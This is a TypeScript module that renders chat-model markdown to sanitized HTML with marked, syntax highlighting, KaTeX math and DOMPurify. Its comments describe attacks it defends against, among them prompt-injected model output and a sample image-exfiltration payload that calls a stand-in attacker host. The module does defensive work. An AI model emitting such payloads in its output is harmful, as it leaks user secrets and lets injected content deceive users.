import DOMPurify from 'dompurify';
import {
  Marked,
  marked,
  type Tokens,
  type TokenizerExtension,
  type RendererExtension,
} from 'marked';
import hljs from './highlighter';
import { mathRenderer, shouldExtractAsMath, isValidLatex } from './mathRenderer';

/**
 * Candidates for fences without a language tag. `highlightAuto` runs every
 * candidate grammar over the text: the full build's 192 grammars cost ~28 ms
 * for 30 lines, this subset ~2 ms.
 */
const AUTO_DETECT_LANGUAGES = [
  'bash',
  'javascript',
  'typescript',
  'json',
  'python',
  'xml',
  'css',
  'sql',
  'yaml',
  'markdown',
  'diff',
  'java',
  'c',
  'cpp',
  'go',
  'rust',
];

/** Auto-detection costs ~3 ms per KB even with the subset; bigger fences are usually logs. */
const AUTO_DETECT_MAX_CHARS = 3000;

function highlightCode(text: string, lang: string | undefined): string {
  try {
    if (lang) {
      // An unknown tag (`log`, `output`, `console`) still says "not code worth guessing"
      return hljs.getLanguage(lang)
        ? hljs.highlight(text, { language: lang }).value
        : escapeHtml(text);
    }
    if (text.length > AUTO_DETECT_MAX_CHARS) return escapeHtml(text);
    return hljs.highlightAuto(text, AUTO_DETECT_LANGUAGES).value;
  } catch {
    return escapeHtml(text);
  }
}

// ============================================================================
// Trusted slots
// ============================================================================

/**
 * HTML we generate ourselves (code blocks with the copy button, KaTeX output,
 * task checkboxes) never meets the sanitizer. The renderers park it here and
 * emit an empty placeholder element; DOMPurify then sees only model-authored
 * HTML, and `renderUncached` swaps the placeholders back afterwards. KaTeX
 * needs inline `style` and the copy button needs `class` / `data-code`, both of
 * which the allowlist refuses to model HTML.
 */
interface SlotState {
  token: string;
  html: string[];
}

let activeSlots: SlotState | null = null;

function newSlotToken(): string {
  // Not randomUUID: it needs a secure context, and server mode is reachable
  // over plain http on a LAN.
  const bytes = crypto.getRandomValues(new Uint8Array(8));
  return Array.from(bytes, b => b.toString(16).padStart(2, '0')).join('');
}

function trustedSlot(html: string, tag: 'div' | 'span'): string {
  if (!activeSlots) throw new Error('markdown parsed outside renderMarkdownSafe');
  const index = activeSlots.html.push(html) - 1;
  return `<${tag} data-md-slot="${activeSlots.token}-${index}"></${tag}>`;
}

const renderer = new marked.Renderer();

renderer.code = ({ text, lang }: Tokens.Code) => {
  // marked passes the whole info string; only its first word names the language
  const language = lang?.match(/^\S+/)?.[0];
  const highlighted = highlightCode(text, language);
  const codeClass = language ? ` class="language-${escapeHtml(language)}"` : '';
  return trustedSlot(
    '<div class="code-block-container">' +
      `<button class="code-copy-button" type="button" aria-label="Copy code" data-code="${escapeHtml(text)}">📋</button>` +
      `<pre><code${codeClass}>${highlighted}</code></pre>` +
      '</div>',
    'div'
  );
};

// A checkbox can sit inside a <p> in loose lists, so its placeholder is inline
renderer.checkbox = ({ checked }: Tokens.Checkbox) =>
  trustedSlot(`<input type="checkbox" disabled${checked ? ' checked' : ''}>`, 'span') + ' ';

// ============================================================================
// Thinking Extension for marked
// ============================================================================

/**
 * Block-level extension for <thinking>...</thinking> tags.
 * Some models output thinking content in plain text within these tags.
 * This extension ensures the closing tag is preserved through markdown parsing.
 */
const thinkingExtension: TokenizerExtension & RendererExtension = {
  name: 'thinking',
  level: 'block',

  start(src: string) {
    return src.indexOf('<thinking>');
  },

  tokenizer(src: string) {
    // Match <thinking>...</thinking> block (non-greedy, handles multiline)
    const match = src.match(/^<thinking>([\s\S]*?)<\/thinking>/);
    if (match) {
      return {
        type: 'thinking',
        raw: match[0],
        // Lexed by the instance that is parsing, so Disable Math holds inside
        // and reference links resolve against the whole message
        tokens: this.lexer.blockTokens(match[1], []),
      };
    }
    return undefined;
  },

  renderer(token) {
    return `<thinking>${this.parser.parse(token.tokens ?? [])}</thinking>`;
  },
};

// ============================================================================
// Math Extensions for marked
// ============================================================================

/**
 * Find next unescaped $ in text starting from position.
 */
function findUnescapedDollar(text: string, start: number): number {
  for (let i = start; i < text.length; i++) {
    if (text[i] === '$') {
      if (i > 0 && text[i - 1] === '\\') {
        continue;
      }
      return i;
    }
  }
  return -1;
}

/**
 * Find the next $$ that is a valid display math delimiter.
 * Must NOT be:
 * - Part of $$$+ run (has $ immediately before or after)
 * - Starting with an escaped $ (preceded by \)
 * Returns -1 if no valid $$ found.
 */
function findIsolatedDoubleDollar(src: string, startPos: number = 0): number {
  let pos = startPos;
  while (pos < src.length) {
    const idx = src.indexOf('$$', pos);
    if (idx === -1) return -1;

    // Check if this $$ is part of $$$+ (has $ immediately before or after)
    const hasDollarBefore = idx > 0 && src[idx - 1] === '$';
    const hasDollarAfter = src[idx + 2] === '$';

    // Check if the first $ of $$ is escaped (e.g., \$$ in $\$\$\$$)
    const firstDollarEscaped = idx > 0 && src[idx - 1] === '\\';

    if (!hasDollarBefore && !hasDollarAfter && !firstDollarEscaped) {
      return idx;
    }

    // Skip past this position and continue searching
    pos = idx + 1;
  }
  return -1;
}

/**
 * Block-level math extension for $$...$$
 */
const blockMathExtension: TokenizerExtension & RendererExtension = {
  name: 'blockMath',
  level: 'block',

  start(src: string) {
    return findIsolatedDoubleDollar(src);
  },

  tokenizer(src: string) {
    // Reject if starting with 3+ consecutive $ (shouldn't happen with new start(), but be safe)
    if (/^\${3,}/.test(src)) return undefined;

    // Match $$...$$ at start of line (block level)
    const match = src.match(/^\$\$([\s\S]+?)\$\$/);
    if (match) {
      const latex = match[1].trim();
      if (isValidLatex(latex)) {
        return {
          type: 'blockMath',
          raw: match[0],
          latex,
        };
      }
    }
    return undefined;
  },

  renderer(token) {
    return trustedSlot(
      mathRenderer.renderDisplay((token as unknown as { latex: string }).latex),
      'div'
    );
  },
};

/**
 * Inline math extension for $...$
 * Uses try-and-skip algorithm with strict validation.
 */
const inlineMathExtension: TokenizerExtension & RendererExtension = {
  name: 'inlineMath',
  level: 'inline',

  start(src: string) {
    return findUnescapedDollar(src, 0);
  },

  tokenizer(src: string) {
    // Reject 3+ consecutive dollar signs (e.g., $$$, $$$$, $$$$$)
    // These are colloquial expressions for "expensive", not math
    if (/^\${3,}/.test(src)) return undefined;

    // Find first $
    const firstDollar = findUnescapedDollar(src, 0);
    if (firstDollar === -1 || firstDollar !== 0) return undefined;

    // Skip if this is $$ (handled by block math)
    if (src[1] === '$') return undefined;

    // Try-and-skip algorithm: find valid math starting at position 0
    let searchPos = 1;
    while (searchPos < src.length) {
      const secondDollar = findUnescapedDollar(src, searchPos);
      if (secondDollar === -1) break;

      // Skip if second $ is part of $$
      if (src[secondDollar + 1] === '$') {
        searchPos = secondDollar + 2;
        continue;
      }

      const content = src.slice(1, secondDollar);

      // No newlines in inline math
      if (content.includes('\n')) {
        searchPos = secondDollar + 1;
        continue;
      }

      // No backticks in math (would interfere with inline code)
      if (content.includes('`')) {
        searchPos = secondDollar + 1;
        continue;
      }

      const trimmed = content.trim();

      if (shouldExtractAsMath(trimmed)) {
        return {
          type: 'inlineMath',
          raw: src.slice(0, secondDollar + 1),
          latex: trimmed,
        };
      }

      // Not valid - try next $ (skip algorithm)
      searchPos = secondDollar + 1;
    }

    return undefined;
  },

  renderer(token) {
    return trustedSlot(
      mathRenderer.renderInline((token as unknown as { latex: string }).latex),
      'span'
    );
  },
};

// Configure marked with GitHub Flavored Markdown, custom renderer, and extensions
marked.use({
  breaks: true,
  gfm: true,
  renderer,
  extensions: [thinkingExtension, blockMathExtension, inlineMathExtension],
});

// Second marked instance without math extensions (for "Disable Math" toggle)
const markedNoMath = new Marked({
  breaks: true,
  gfm: true,
  renderer,
  extensions: [thinkingExtension],
});

// ============================================================================
// Sanitizer
// ============================================================================

/**
 * Model output, including prompt-injected tool and web content, may only use
 * markdown's own vocabulary plus inline formatting. No `style` (one
 * `<style>*{display:none}</style>` hides the app), no form controls, no media
 * or SVG that fetch on their own, and no classes except `citation-link`: the
 * bundle's Tailwind utilities would let `class="fixed inset-0 z-50"` draw a
 * fake overlay, and a forged `code-copy-button` would hijack the clipboard.
 */
const SANITIZE_CONFIG = {
  ALLOWED_TAGS: (
    'a abbr b blockquote br caption cite code col colgroup dd del details dfn div dl dt em ' +
    'figcaption figure h1 h2 h3 h4 h5 h6 hr i img ins kbd li mark ol p pre q rp rt ruby s ' +
    'samp small span strong sub summary sup table tbody td tfoot th thead time tr u ul var ' +
    'wbr thinking'
  ).split(' '),
  ALLOWED_ATTR: (
    'href title alt src colspan rowspan align start reversed open class lang dir datetime ' +
    'data-cited data-md-slot'
  ).split(' '),
  ALLOW_DATA_ATTR: false,
};

const ALLOWED_CLASSES = new Set(['citation-link']);

/**
 * Remote images would load on render, which is the classic exfiltration
 * channel (`![](https://attacker/?d=SECRET)`). They become a link the user can
 * choose to open; inline `data:image/…` stays an image.
 */
function replaceRemoteImage(img: Element): void {
  const src = img.getAttribute('src') ?? '';
  if (/^data:image\//i.test(src)) return;

  const doc = img.ownerDocument;
  const alt = img.getAttribute('alt')?.trim() || 'image';
  let host = '';
  try {
    host = new URL(src, location.href).host;
  } catch {
    // Label without a host
  }
  const label = `🖼 ${alt}${src && host ? ` (${host})` : ''}`;

  // No src left (DOMPurify dropped a javascript: URL): nothing to link to
  if (!src) {
    img.replaceWith(doc.createTextNode(label));
    return;
  }
  // Inside a link (README badges): a nested <a> would break the outer link
  if (img.parentElement?.closest('a')) {
    const span = doc.createElement('span');
    span.textContent = label;
    img.replaceWith(span);
    return;
  }
  const link = doc.createElement('a');
  link.setAttribute('href', src);
  link.setAttribute('target', '_blank');
  link.setAttribute('rel', 'noopener noreferrer');
  link.textContent = label;
  img.replaceWith(link);
}

// Registered on the default instance, which only this module uses. Removing
// first keeps HMR from stacking a second copy.
DOMPurify.removeHooks('uponSanitizeAttribute');
DOMPurify.removeHooks('afterSanitizeAttributes');

DOMPurify.addHook('uponSanitizeAttribute', (_node, event) => {
  if (event.attrName === 'class') {
    const kept = event.attrValue.split(/\s+/).filter(name => ALLOWED_CLASSES.has(name));
    if (kept.length > 0) event.attrValue = kept.join(' ');
    else event.keepAttr = false;
  } else if (event.attrName === 'data-md-slot') {
    // Only placeholders from this render carry the token; forged ones are dropped
    const token = activeSlots?.token;
    if (!token || !new RegExp(`^${token}-\\d+$`).test(event.attrValue)) event.keepAttr = false;
  }
});

DOMPurify.addHook('afterSanitizeAttributes', node => {
  if (node.nodeName === 'A' && node.hasAttribute('href')) {
    // Links open in a new tab instead of replacing the app
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  } else if (node.nodeName === 'IMG') {
    replaceRemoteImage(node);
  }
});

function renderUncached(content: string, disableMath: boolean): string {
  const slots: SlotState = { token: newSlotToken(), html: [] };
  activeSlots = slots;
  try {
    const parsed = (disableMath ? markedNoMath : marked).parse(content) as string;
    const clean = DOMPurify.sanitize(parsed, SANITIZE_CONFIG);
    if (slots.html.length === 0) return clean;
    const placeholder = new RegExp(`<(div|span) data-md-slot="${slots.token}-(\\d+)"></\\1>`, 'g');
    // A replacer function: a replacement string would expand `$&` / `` $` ``
    // found in highlighted shell code
    return clean.replace(placeholder, (_match, _tag, index: string) => slots.html[+index] ?? '');
  } finally {
    activeSlots = null;
  }
}

// LRU of rendered HTML. Messages remount often (virtualization placeholders,
// focus-mode toggles, streaming → final bubble), and a parse costs marked +
// hljs + KaTeX + DOMPurify. Map iteration order doubles as recency order.
const RENDER_CACHE_MAX_ENTRIES = 200;
const RENDER_CACHE_MAX_CHARS = 4_000_000;
const renderCache = new Map<string, string>();
let renderCacheChars = 0;

function cacheGet(key: string): string | undefined {
  const html = renderCache.get(key);
  if (html !== undefined) {
    renderCache.delete(key);
    renderCache.set(key, html);
  }
  return html;
}

function cacheSet(key: string, html: string): void {
  if (key.length > RENDER_CACHE_MAX_CHARS) return;
  renderCache.set(key, html);
  renderCacheChars += key.length;
  while (renderCache.size > RENDER_CACHE_MAX_ENTRIES || renderCacheChars > RENDER_CACHE_MAX_CHARS) {
    const oldest = renderCache.keys().next().value as string;
    renderCache.delete(oldest);
    renderCacheChars -= oldest.length;
  }
}

/** Drop every cached render. Tests use it to count real parses. */
export function clearMarkdownCache(): void {
  renderCache.clear();
  renderCacheChars = 0;
}

/** Test-only: the number of cached renders. */
export function markdownCacheSize(): number {
  return renderCache.size;
}

/**
 * Markdown to sanitized HTML: marked (with hljs and math), then DOMPurify.
 * Math is handled by marked extensions, so code blocks are protected automatically.
 * Results are cached by input; the renderer config never changes at runtime.
 * `cache: false` still reads the cache but doesn't store: a streaming reply
 * renders a new prefix of itself every flush, and storing each one would push
 * every finished message out of the LRU.
 */
export function renderMarkdownSafe(
  content: string,
  options?: { disableMath?: boolean; cache?: boolean }
): string {
  const key = (options?.disableMath ? '0' : '1') + content;
  const cached = cacheGet(key);
  if (cached !== undefined) return cached;

  const html = renderUncached(content, options?.disableMath === true);
  if (options?.cache !== false) cacheSet(key, html);
  return html;
}

export function escapeHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
